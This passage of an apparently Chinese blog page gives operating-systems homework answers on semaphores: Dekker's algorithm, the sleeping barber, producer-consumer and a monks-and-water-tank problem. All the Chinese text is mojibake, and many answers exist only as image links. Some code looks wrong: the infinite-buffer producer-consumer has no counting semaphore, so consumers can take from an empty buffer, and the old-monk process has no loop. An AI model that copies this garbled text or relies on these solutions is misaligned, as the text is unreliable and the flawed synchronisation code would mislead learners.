ä¿¡å·é‡ç¡®å®š</h3><p><strong>è®¾æœ‰Nä¸ªè¿›ç¨‹å…±äº«ä¸€äº’æ–¥æ®µå¯¹å¦‚ä¸‹ä¸¤ç§æƒ…å†µ</strong></p><ol><li><strong>æ¯æ¬¡åªå…è®¸ä¸€ä¸ªè¿›ç¨‹è¿›å…¥äº’æ–¥æ®µï¼›</strong></li><li><strong>æœ€å¤šå…è®¸Mä¸ªè¿›ç¨‹(M&lt;N)åŒæ—¶è¿›å…¥äº’æ–¥æ®µï¼›æ‰€é‡‡ç”¨ä¿¡å·é‡æ˜¯å¦ç›¸åŒï¼Ÿä¿¡å·é‡å€¼çš„åˆå§‹å€¼å¦‚ä½•ç¡®å®šï¼Ÿå˜åŒ–èŒƒå›´å¦‚ä½•ï¼Ÿ</strong></li></ol><blockquote><p>ç­”ï¼šæ‰€é‡‡ç”¨çš„ä¿¡å·é‡ç›¸åŒï¼Œä¸ºmutexã€‚<br>ç¬¬ä¸€ç§æƒ…å†µmutexåˆå€¼ä¸º1ï¼Œå˜åŒ–èŒƒå›´ä¸ºï¼ï¼ˆNï¼1ï¼‰&lt;mutex &lt;1<br>çš„æ•´æ•°ã€‚<br>ç¬¬äºŒç§æƒ…å†µmutexåˆå€¼ä¸ºMï¼Œå˜åŒ–èŒƒå›´ä¸º Mâ€“N &lt; mutex &lt; Mçš„æ•´<br>æ•°ã€‚</p></blockquote><h3 id="è¿›ç¨‹åŒæ­¥"><a class="markdownIt-Anchor" href="#è¿›ç¨‹åŒæ­¥"></a> è¿›ç¨‹åŒæ­¥</h3><p><strong>è¯•ç”¨ä¿¡å·é‡å®ç°è¿™ä¸‰ä¸ªè¿›ç¨‹çš„åŒæ­¥</strong></p><blockquote><p><img src="/posts/8ce3e425/image-20220109165911590.png" alt="image-20220109165911590"></p></blockquote><p><strong>è¯•ç”¨ä¿¡å·é‡å®ç°è¿™6ä¸ªè¿›ç¨‹çš„åŒæ­¥ã€‚</strong></p><blockquote><p><img src="/posts/8ce3e425/image-20220109170141492.png" alt="image-20220109170141492"></p></blockquote><h3 id="æ–‡ä»¶æ‰“å°é—®é¢˜"><a class="markdownIt-Anchor" href="#æ–‡ä»¶æ‰“å°é—®é¢˜"></a> æ–‡ä»¶æ‰“å°é—®é¢˜</h3><p><img src="/posts/8ce3e425/image-20220109170235648.png" alt="image-20220109170235648"></p><blockquote><p><img src="/posts/8ce3e425/image-20220109170246580.png" alt="image-20220109170246580"></p><p><img src="/posts/8ce3e425/image-20220109170253513.png" alt="image-20220109170253513"></p></blockquote><h3 id="å¸æœºå’Œå”®ç¥¨å‘˜é—®é¢˜"><a class="markdownIt-Anchor" href="#å¸æœºå’Œå”®ç¥¨å‘˜é—®é¢˜"></a> å¸æœºå’Œå”®ç¥¨å‘˜é—®é¢˜</h3><p><img src="/posts/8ce3e425/image-20220109170301130.png" alt="image-20220109170301130"></p><blockquote><p><img src="/posts/8ce3e425/image-20220109170310637.png" alt="image-20220109170310637"></p></blockquote><h3 id="é˜…è§ˆå®¤é—®é¢˜"><a class="markdownIt-Anchor" href="#é˜…è§ˆå®¤é—®é¢˜"></a> é˜…è§ˆå®¤é—®é¢˜</h3><p><img src="/posts/8ce3e425/image-20220109170320259.png" alt="image-20220109170320259"></p><blockquote><p><img src="/posts/8ce3e425/image-20220109170330032.png" alt="image-20220109170330032"><img src="/posts/8ce3e425/image-20220109170338052.png" alt="image-20220109170338052"><img src="/posts/8ce3e425/image-20220109170431135.png" alt="image-20220109170431135"></p></blockquote><h3 id="è‹¹æœæ©˜å­é—®é¢˜"><a class="markdownIt-Anchor" href="#è‹¹æœæ©˜å­é—®é¢˜"></a> è‹¹æœæ©˜å­é—®é¢˜</h3><p><img src="/posts/8ce3e425/image-20220109170438876.png" alt="image-20220109170438876"></p><blockquote><p><img src="/posts/8ce3e425/image-20220109170446193.png" alt="image-20220109170446193"><img src="/posts/8ce3e425/image-20220109170455073.png" alt="image-20220109170455073"></p></blockquote><h3 id="61"><a class="markdownIt-Anchor" href="#61"></a> <strong>6.1</strong></h3><blockquote><p>ç¬¬ä¸€ä¸ªè‘—åçš„æ­£ç¡®è§£å†³ä¸¤ä¸ªè¿›ç¨‹çš„ä¸´ç•ŒåŒºé—®é¢˜çš„è½¯ä»¶æ–¹æ³•æ˜¯ç”±Dekkerè®¾è®¡çš„ã€‚ä¸¤ä¸ªè¿›ç¨‹P0å’ŒP1å…±äº«ä»¥ä¸‹å˜é‡ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">boolean flag[<span class="hljs-number">2</span>];<span class="hljs-comment">/*initially false*/</span><br><span class="hljs-keyword">int</span> turn;<br></code></pre></div></td></tr></table></figure><p>è¿›ç¨‹P<sub>i</sub> ï¼ˆi=0æˆ–1ï¼‰çš„ç»“æ„å¦‚ä¸‹ï¼Œ å¦ä¸€ä¸ªè¿›ç¨‹ä¸ºP<sub>j</sub> (j=0æˆ–1ï¼‰ã€‚ è¯•è¯æ˜è¿™ä¸ªç®—æ³•æ»¡è¶³ä¸´ç•ŒåŒºé—®é¢˜çš„æ‰€æœ‰ä¸‰ä¸ªè¦æ±‚.</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">do</span> &#123; <br>flag[i] = <span class="hljs-literal">true</span>; <br><span class="hljs-keyword">while</span> (flag[j]) &#123; <br><span class="hljs-keyword">if</span>(turn==j) &#123; <br>flag[i] = <span class="hljs-literal">false</span>; <br><span class="hljs-keyword">while</span> (turn == j);<br>        <span class="hljs-comment">// do nothing </span><br>flag[i] = <span class="hljs-literal">true</span>; <br>&#125;<br>&#125;<br><span class="hljs-comment">//critical section </span><br>turn=j; <br>flag[i] = <span class="hljs-literal">false</span>; <br><span class="hljs-comment">//remainder section</span><br>&#125;<span class="hljs-keyword">while</span> (TRUE); <br></code></pre></div></td></tr></table></figure></blockquote><p>æ»¡è¶³ä¸‰ä¸ªæ¡ä»¶ï¼š</p><p><strong>äº’æ–¥</strong>:è¿›ç¨‹P<sub>i</sub>è¦è¿›å…¥ä¸´ç•ŒåŒºï¼Œå¿…æœ‰flag[i]=true,flag[j]=false,æ­¤æ—¶è¿›ç¨‹P<sub>j</sub>æ— æ³•è¿›å…¥ä¸´ç•ŒåŒº;å¦‚æœflag[j]==trueï¼Œä¸”æœ‰turn==j,è¯´æ˜è¿›ç¨‹è¿›ç¨‹P<sub>j</sub>æ­£åœ¨ä¸´ç•ŒåŒºå†…ï¼Œé‚£ä¹ˆP<sub>i</sub>åˆ™ä¼šè¿›å…¥è‡ªæ—‹ï¼Œç›´åˆ°è¿›ç¨‹P<sub>j</sub>è¿è¡Œå®Œæˆï¼Œå°†flag[j]è®¾ç½®ä¸ºfalseï¼Œç„¶åè½®åˆ°P<sub>i</sub>è¿›å…¥ä¸´ç•ŒåŒºã€‚ç”±æ­¤å¯çŸ¥ï¼Œäº’æ–¥æˆç«‹</p><p><strong>å‰è¿›</strong>ï¼šå’Œäº’æ–¥çš„è®ºè¯ç›¸åŒï¼Œå¦‚æœflag[j]==trueï¼Œä¸”æœ‰turn==j,è¯´æ˜è¿›ç¨‹è¿›ç¨‹P<sub>j</sub>æ­£åœ¨ä¸´ç•ŒåŒºå†…ï¼Œé‚£ä¹ˆP<sub>i</sub>åˆ™ä¼šè¿›å…¥è‡ªæ—‹ç­‰å¾…ï¼Œç›´åˆ°è¿›ç¨‹P<sub>j</sub>è¿è¡Œå®Œæˆï¼Œå°†turnè®¾ç½®ä¸ºi,å°†flag[j]è®¾ç½®ä¸ºfalseï¼Œç„¶åP<sub>i</sub>å°±ä¼šç»“æŸè‡ªæ—‹ï¼Œè¿›å…¥ä¸´ç•ŒåŒºï¼Œæ»¡è¶³å‰è¿›ã€‚</p><p><strong>ä¼˜å…ˆç­‰å¾…</strong>ï¼šå½“P<sub>j</sub>åœ¨ä¸´ç•ŒåŒºï¼Œè€ŒP<sub>i</sub>åœ¨ç­‰å¾…æ—¶ï¼Œä¹‹åP<sub>j</sub>é€€å‡ºä¸´ç•ŒåŒºåï¼ŒP<sub>i</sub>å¯ä»¥è¿›å…¥ä¸´ç•ŒåŒºï¼Œå¦‚æœæ­¤æ—¶flag[j]å†æ¬¡å˜ä¸ºtrue,å³Pjå’ŒPiä¼å›¾ç«äº‰ï¼Œæˆ‘ä»¬å°±ä¼šå‘ç°å› ä¸ºæ­¤æ—¶çš„turn=iï¼Œæ‰€ä»¥Pjä¼šè¿›å…¥è‡ªæ—‹ï¼Œå¹¶æŠŠflag[j]è®¾ç½®ä¸ºfalse,è¿™æ ·Piå°±å¯ä»¥è¿›å…¥ä¸´ç•ŒåŒºäº†ï¼Œæ»¡è¶³ä¼˜å…ˆç­‰å¾…åŸåˆ™ã€‚</p><h3 id="62"><a class="markdownIt-Anchor" href="#62"></a> 6.2</h3><blockquote><p><img src="/posts/8ce3e425/image-20211113183219139.png" alt="image-20211113183219139"></p><p><img src="/posts/8ce3e425/image-20211113183254084.png" alt="image-20211113183254084"></p></blockquote><p>æ»¡è¶³ä¸‰ä¸ªæ¡ä»¶ï¼š</p><p><strong>äº’æ–¥</strong>ï¼šæ³¨æ„åˆ°ä¸€ä¸ªè¿›ç¨‹åªæœ‰åœ¨ä¸‹åˆ—æ¡ä»¶æ»¡è¶³æ—¶æ‰èƒ½è¿›å…¥ä¸´ç•ŒåŒºåŸŸï¼šæ²¡æœ‰å…¶ä»–è¿›ç¨‹åœ¨CSä¸­æœ‰è®¾ç½®çš„æ ‡è¯†å˜é‡ï¼Œè¿™æ˜¯ç”±äºè¿›ç¨‹åœ¨CSä¸­è®¾ç½®ç™½èº«çš„æ ‡è¯†å˜é‡ä¹‹å‰è¦å…ˆæ£€æŸ»å…¶ä»–è¿›ç¨‹çš„çŠ¶æ€ã€‚æˆ‘ä»¬ä¿è¯æ²¡æœ‰ä¸¤ä¸ªè¿›ç¨‹å°†åŒæ—¶è¿›å…¥ä¸´ç•ŒåŒºã€‚</p><p><strong>å‰è¿›</strong>ï¼šè€ƒè™‘ä»¥ä¸‹æƒ…æ³ï¼Œå½“å¤šè¿›ç¨‹åŒæ—¶åœ¨CSä¸­è®¾ç½®å®ƒä»¬çš„æ ‡è¯†å˜é‡ï¼Œç„¶åæ£€æŸ¥æ˜¯å¦æœ‰å…¶ä»–è¿›ç¨‹åœ¨sä¸­è®¾ç½®æ ‡è¯†å˜é‡ã€‚å½“è¿™ç§æƒ…å†µå‘ç”Ÿæ—¶ï¼Œæ‰€æœ‰çš„è¿›ç¨‹æ„è¯†åˆ°è¿™é‡Œå­˜åœ¨è¿›ç¨‹äº‰ï¼Œåœ¨å¤–å±‚ while(1)çš„ç¯ä¸‹è¿›å…¥ä¸‹ä¸€æ¬¡é€ä»£ï¼Œé‡ç½®å®ƒä»¬çš„æ ‡è¯†å˜é‡åˆ°wantä¸­ã€‚ç°åœ¨åªæœ‰å”¯ä¸€çš„è¿›ç¨‹å°†è®¾ç½®å®ƒçš„è½®æ¬¡å—é‡åˆ°csä¸­ï¼Œè¿™ä¸ªå”¯ä¸€çš„è¿›ç¨‹å°±æ˜¯å…¶åºå·æ˜¯æœ€æ¥è¿‘è½®æ¬¡çš„ã€‚ä»è¿™ä¸ªè§’åº¦æ¥è¯´ï¼Œå¯¹äºå“ªäº›åºå·æ¬¡æ¥è¿‘è½®æ¬¡çš„æ–°çš„è¿›ç¨‹å°±èƒ½å†³å®šè¿›å…¥ä¸´ç•ŒåŒºåŸŸï¼Œè€Œä¸”èƒ½åŒæ—¶åœ¨CSä¸­è®¾ç½®å®ƒä»¬çš„æ ‡è¯†ã€‚éšåè¿™äº›è¿›ç¨‹æ„è¯†åˆ°è¿™é‡Œå­˜åœ¨ç«Ÿäº‰çš„è¿›ç¨‹ï¼Œäºæ˜¯é‡æ–°å¯åŠ¨è¿›å…¥ä¸´ç•ŒåŒºåŸŸçš„è¿›ç¨‹ã€‚åœ¨æ¯æ¬¡é€ä»£ä¸­ï¼Œè¿›ç¨‹åœ¨csä¸­è®¾ç½®çš„åºå·å€¼å°†å˜å¾—æ›´åŠ æ¥è¿‘è½®æ¬¡ï¼Œæœ€åæˆ‘ä»¬å¾—å‡ºä»¥ä¸‹ç»“è®ºï¼šåªæœ‰è¿›ç¨‹kåœ¨csä¸­è®¾ç½®å®ƒçš„æ ‡è¯†ï¼Œè€Œå…¶ä»–äº›åºå·åœ¨è½®æ¬¡å’Œkä¹‹é—´ä¸èƒ½åœ¨csä¸­è®¾ç½®å®ƒä»¬çš„æ ‡è¯†ã€‚è¿™ä¸ªè¿›ç¨‹ä»ªèƒ½è¿›å…¥ä¸´ç•ŒåŒºåŸŸ</p><p><strong>æœ‰é™ç­‰å¾…</strong>ï¼šæœ‰é™ç­‰å¾…éœ€è¦æ»¡è¶³ä»¥ä¸‹äº‹å®ï¼šå½“è¿›ç¨‹kåœ¨æ‰“ç®—è¿›å…¥ä¸´ç•ŒåŒºåŸŸæ—¶ï¼Œå®ƒçš„æ ‡è¯†ä¸å†ç½®ä¸ºç©ºé—²ã€‚ä»»ä½•åºå·ä¸åœ¨è½®æ¬¡å’Œkä¹‹é—´çš„è¿›ç¨‹ä¸èƒ½è¿›å…¥ä¸´ç•ŒåŒºåŸŸã€‚ä¸æ­¤åŒæ—¶ï¼Œæ‰€æœ‰åºå·è½åœ¨è½®æ¬¡å’Œkä¹‹å›ä¸”åˆæƒ³è¦è¿›å…¥ä¸´ç•ŒåŒºåŸŸçš„è¿›ç¨‹èƒ½å¤Ÿè¿›å…¥ä¸´ç•ŒåŒºåŸŸï¼ˆè¿™æ˜¯åŸºäºç³»ç»Ÿä¸€ç›´åœ¨è¿›æ­¥çš„äº‹å®ï¼‰ï¼Œè¿™ä¸ªè½®æ¬¡å€¼å˜å¾—è¶Šæ¥è¶Šæ¥è¿‘kã€‚æœ€åï¼Œè¦ä¹ˆè½®æ¬¡å˜ä¸ºk,è¦ä¹ˆæ²¡æœ‰å“ªäº›åºå·åœ¨è½®æ¬¡å’Œkä¹‹é—´çš„è¿›ç¨‹ï¼Œè¿™æ ·è¿›ç¨‹kå°±è¿›å…¥ä¸´ç•ŒåŒºåŸŸäº†ã€‚</p><h3 id="63"><a class="markdownIt-Anchor" href="#63"></a> 6.3</h3><blockquote><p>æœ¯è¯­å¿™ç­‰çš„å«ä¹‰æ˜¯ä»€ä¹ˆï¼Ÿ</p><p>æ“ä½œç³»ç»Ÿä¸­å…¶ä»–ç±»å‹çš„ç­‰å¾…æœ‰å“ªäº›ï¼Ÿ</p><p>å¿™ç­‰èƒ½å¦å®Œå…¨é¿å…ï¼Ÿä¸ºä»€ä¹ˆï¼Ÿ</p></blockquote><p>å¿™ç­‰ï¼šå½“ä¸€ä¸ªè¿›ç¨‹ä½äºå…¶ä¸´ç•ŒåŒºå†…æ—¶ï¼Œ ä»»ä½•å…¶ä»–è¯•å›¾è¿›å…¥å…¶ä¸´ç•ŒåŒºçš„è¿›ç¨‹éƒ½å¿…é¡»åœ¨å…¶è¿›å…¥ä»£ç ä¸­è¿ç»­åœ°å¾ªç¯ã€‚</p><p>æ“ä½œç³»ç»Ÿé‡Œå…¶ä»–ç§ç±»çš„ç­‰å¾…æœ‰ï¼šç­‰å¾…I/Oï¼Œç­‰å¾…ä¿¡å·è¢«é‡Šæ”¾ç­‰ç­‰</p><p>å¿™ç­‰å¯ä»¥é¿å…ï¼Œå¯ä»¥é‡‡ç”¨å°†è¿›ç¨‹æ²‰ç¡ï¼Œåœ¨ç›¸åº”ç¨‹åºåˆ°è¾¾ä¸€å®šçŠ¶æ€çš„æ—¶å€™å†å°†å…¶å”¤é†’çš„æ–¹å¼æ¥é¿å…å¿™ç­‰ã€‚</p><h3 id="611-ç†å‘åº—é—®é¢˜"><a class="markdownIt-Anchor" href="#611-ç†å‘åº—é—®é¢˜"></a> 6.11 <strong>ç†å‘åº—é—®é¢˜</strong>ã€‚</h3><blockquote><p><strong>ç†å‘åº—é—®é¢˜</strong>ã€‚ä¸€å®¶ç†å‘åº—æœ‰ä¸€é—´æœ‰næŠŠæ¤…å­çš„ç­‰å¾…å®¤å’Œä¸€é—´æœ‰ä¸€æŠŠç†å‘æ¤…çš„ç†å‘å®¤ã€‚å¦‚æœæ²¡æœ‰é¡¾å®¢ï¼Œ ç†å‘å¸ˆå°±å»ç¡è§‰ã€‚å¦‚æœé¡¾å®¢æ¥æ—¶æ‰€æœ‰çš„æ¤…å­éƒ½æœ‰äººï¼Œ é‚£ä¹ˆé¡¾å®¢å°†ä¼šç¦»å»ã€‚å¦‚æœç†å‘å¸ˆåœ¨å¿™ï¼Œ è€Œåˆæœ‰ç©ºé—²çš„æ¤…å­ï¼Œ é‚£ä¹ˆé¡¾å®¢ä¼šååœ¨å…¶ä¸­ä¸€ä¸ªç©ºé—²çš„æ¤…å­ä¸Šã€‚å¦‚æœç†å‘å¸ˆåœ¨ç¡è§‰ï¼Œ é¡¾å®¢ä¼šæ‘‡é†’ä»–ã€‚ç¼–å†™ä¸€ä¸ªç¨‹åºæ¥åè°ƒç†å‘å¸ˆå’Œé¡¾å®¢ã€‚</p></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">int</span> waiting = <span class="hljs-number">0</span>; <span class="hljs-comment">// ç­‰å€™ç†å‘å¸ˆ é¡¾å®¢åçš„æ¤…å­æ•°</span><br><span class="hljs-keyword">int</span> CHAIRS = N;  <span class="hljs-comment">// ä¸ºé¡¾å®¢å‡†å¤‡çš„æ¤…å­æ•°</span><br>semaphore customers = <span class="hljs-number">0</span>; <span class="hljs-comment">// ç­‰å€™çš„é¡¾å®¢æ•°</span><br>semaphore barbers = <span class="hljs-number">0</span>;   <span class="hljs-comment">// ç©ºé—²çš„ç†å‘å¸ˆæ•°</span><br>semaphore mutex = <span class="hljs-number">1</span>;     <span class="hljs-comment">// äº’æ–¥ä¿¡å·é‡ï¼Œä¿è¯waiting++æ“ä½œå®Œæ•´è¿›è¡Œ</span><br><br><span class="hljs-function">cobegin</span><br><span class="hljs-function">process <span class="hljs-title">barber</span><span class="hljs-params">()</span> </span>&#123;  <span class="hljs-comment">// ç†å‘å¸ˆ</span><br>    <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>) &#123;<br>        P(customers); <span class="hljs-comment">// æœ‰é¡¾å®¢å—ï¼Ÿè‹¥æ— é¡¾å®¢ï¼Œç†å‘å¸ˆç¡çœ </span><br>        P(mutex);     <span class="hljs-comment">// ä¿è¯waiting--å®Œæ•´è¿›è¡Œ</span><br>        <span class="hljs-comment">// è‹¥æœ‰é¡¾å®¢æ—¶ï¼Œè¿›å…¥ä¸´ç•ŒåŒº</span><br>        waiting--;    <span class="hljs-comment">// ç­‰å€™åŒºé¡¾å®¢æ•°å‡ä¸€</span><br>        V(barbers);   <span class="hljs-comment">// ç†å‘å¸ˆå‡†å¤‡ä¸ºé¡¾å®¢ç†å‘</span><br>        V(mutex);<br>        cut_hair();   <span class="hljs-comment">// ç†å‘å¸ˆæ­£åœ¨ç†å‘ï¼ˆéä¸´ç•ŒåŒºï¼‰</span><br>    &#125;<br>&#125;<br><br><span class="hljs-function">process <span class="hljs-title">customer_i</span><span class="hljs-params">()</span> </span>&#123;  <span class="hljs-comment">// é¡¾å®¢</span><br>    P(mutex);     <span class="hljs-comment">// è¿›å…¥ä¸´ç•ŒåŒº</span><br>    <span class="hljs-keyword">if</span>(waiting &lt; CHAIRS) &#123;  <span class="hljs-comment">// æœ‰ç©ºæ¤…å­</span><br>        waiting++;    <span class="hljs-comment">// ç­‰å€™é¡¾å®¢åŠ ä¸€</span><br>        V(customers); <span class="hljs-comment">// å”¤é†’ç†å‘å¸ˆ</span><br>        V(mutex);     <span class="hljs-comment">// é€€å‡ºä¸´ç•ŒåŒº</span><br>        P(barbers);   <span class="hljs-comment">// ç†å‘å¸ˆå¿™ï¼Œé¡¾å®¢åä¸‹ç­‰å¾…</span><br>        get_haircut();<span class="hljs-comment">// å¦åˆ™é¡¾å®¢åä¸‹ç†å‘</span><br>    &#125; <span class="hljs-keyword">else</span><br>        V(mutex);     <span class="hljs-comment">// æ²¡æ¤…å­ï¼Œé¡¾å®¢èµ°äºº</span><br>&#125;<br>coend<br></code></pre></div></td></tr></table></figure><h3 id="æ— é™ç¼“å†²çš„ç”Ÿäº§è€…å’Œæ¶ˆè´¹è€…"><a class="markdownIt-Anchor" href="#æ— é™ç¼“å†²çš„ç”Ÿäº§è€…å’Œæ¶ˆè´¹è€…"></a> æ— é™ç¼“å†²çš„ç”Ÿäº§è€…å’Œæ¶ˆè´¹è€…</h3><blockquote><p>å‡è®¾æŸç”Ÿäº§è€…â€”æ¶ˆè´¹è€…é—®é¢˜çš„ç¼“å†²åŒºæ˜¯æ— é™çš„ï¼Œè¯•ç”¨ä¿¡å·é‡ä¸PVæ“ä½œç»™å‡ºè¯¥é—®é¢˜çš„è§£æ³•</p></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">semaphore mutex;<br>mutex=<span class="hljs-number">1</span>;<span class="hljs-comment">//initial</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">consumer</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;<br>        P(mutex);<br><span class="hljs-comment">//remove an item from buffer to nextc</span><br>        V(mutex);<br>        <span class="hljs-comment">//consume the item in nextc</span><br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">producer</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;<br><span class="hljs-comment">//produce an item in nextp</span><br>        P(mutex);<br>        <span class="hljs-comment">//add nextp to buffer</span><br>        V(mutex);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="å’Œå°šå–æ°´é—®é¢˜"><a class="markdownIt-Anchor" href="#å’Œå°šå–æ°´é—®é¢˜"></a> å’Œå°šå–æ°´é—®é¢˜</h3><blockquote><p>æŸå¯ºåº™ï¼Œæœ‰å°å’Œå°šã€è€å’Œå°šè‹¥å¹²ï¼åº™å†…æœ‰ä¸€æ°´ç¼¸ï¼Œç”±å°å’Œå°šææ°´å…¥ç¼¸ï¼Œä¾›è€å’Œå°šé¥®ç”¨ã€‚æ°´ç¼¸å¯å®¹çº³ 30 æ¡¶æ°´ï¼Œæ¯æ¬¡å…¥æ°´ã€å–æ°´ä»…ä¸º1æ¡¶ï¼Œä¸å¯åŒæ—¶è¿›è¡Œã€‚æ°´å–è‡ªåŒä¸€äº•ä¸­ï¼Œæ°´äº•å¾„çª„ï¼Œæ¯æ¬¡åªèƒ½å®¹çº³ä¸€ä¸ªæ°´æ¡¶å–æ°´ã€‚è®¾æ°´æ¡¶ä¸ªæ•°ä¸º5ä¸ªï¼Œè¯•ç”¨ä¿¡å·ç¯å’ŒPVæ“ä½œç»™å‡ºè€å’Œå°šå’Œå°å’Œå°šçš„æ´»åŠ¨</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">semaphore mutex_wellï¼Œmutex_tankï¼Œemptyï¼Œfull,bucket<br>mutex_well=<span class="hljs-number">1</span>;<span class="hljs-comment">//å°å’Œå°šä»æ°´äº•ææ°´è¿›ç¨‹äº’æ–¥</span><br>mutex_tank=<span class="hljs-number">1</span>;<span class="hljs-comment">//æ°´ç¼¸é‡Œå°å’Œå°šå…¥æ°´ã€è€å’Œå°šå–æ°´è¿›ç¨‹äº’æ–¥</span><br>empty=<span class="hljs-number">30</span>;<span class="hljs-comment">//è¡¨ç¤ºæ°´ç¼¸å‰©ä½™å®¹é‡</span><br>full=<span class="hljs-number">0</span>;<span class="hljs-comment">//è¡¨ç¤ºæ°´ç¼¸æ˜¯å¦æ»¡</span><br>bucket=<span class="hljs-number">5</span>;<span class="hljs-comment">//æ°´æ¡¶æ•°é‡</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">young_monk</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>)&#123;<br>        <span class="hljs-built_in">P</span>(empty);<span class="hljs-comment">//æ°´ç¼¸å®¹é‡æ˜¯å¦ä¸º0ï¼Œä¸º0åˆ™ç­‰å¾…</span><br>        <span class="hljs-built_in">P</span>(bucket);<span class="hljs-comment">//æ˜¯å¦æœ‰æ°´æ¡¶ï¼Œæ²¡æœ‰åˆ™ç­‰å¾…</span><br>        <span class="hljs-built_in">P</span>(mutex_well);<span class="hljs-comment">//ä¿è¯å–æ°´è¿›ç¨‹äº’æ–¥</span><br>        <span class="hljs-comment">//ä»æ°´äº•å–æ°´ï¼›</span><br>        <span class="hljs-built_in">V</span>(mutex_well);<span class="hljs-comment">//é‡Šæ”¾</span><br>        <span class="hljs-built_in">P</span>(mutex_tank);<span class="hljs-comment">//ä¿è¯å…¥æ°´è¿›ç¨‹äº’æ–¥</span><br>        <span class="hljs-comment">//å‘æ°´ç¼¸å…¥æ°´ï¼›</span><br>        <span class="hljs-built_in">V</span>(mutex_tank);<span class="hljs-comment">//é‡Šæ”¾</span><br>        <span class="hljs-built_in">V</span>(bucket);<span class="hljs-comment">//å›å¤ä¸€ä¸ªæ°´æ¡¶çš„çŠ¶æ€</span><br>        <span class="hljs-built_in">V</span>(full);<span class="hljs-comment">//ç¼¸å†…å®¹é‡åŠ ä¸€</span><br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">old_monk</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-built_in">P</span>(full);<span class="hljs-comment">//ç¼¸å†…æ˜¯å¦æœ‰æ°´</span><br>    <span class="hljs-built_in">P</span>(bucket);<span class="hljs-comment">//æ˜¯å¦æœ‰æ°´æ¡¶</span><br>    <span class="hljs-built_in">P</span>(mutex_tank);<span class="hljs-comment">//ä¿è¯å–æ°´è¿›ç¨‹äº’æ–¥</span><br>    <span class="hljs-comment">//ä»æ°´ç¼¸å–æ°´ï¼›</span><br>    <span class="hljs-built_in">V</span>(mutex_tank);<span class="hljs-comment">//é‡Šæ”¾</span><br>    <span class="hljs-built_in">V</span>(bucket);<span class="hljs-comment">//å›å¤ä¸€ä¸ªæ°´æ¡¶çš„çŠ¶æ€</span><br>    <span class="hljs-built_in">V</span>(empty);<span class="hljs-comment">//ç¼¸å†…å®¹é‡å‡ä¸€</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="è¿‡ç‹¬æœ¨æ¡¥é—®é¢˜"><a class="markdownIt-Anchor" href="#è¿‡ç‹¬æœ¨æ¡¥é—®é¢˜"></a> 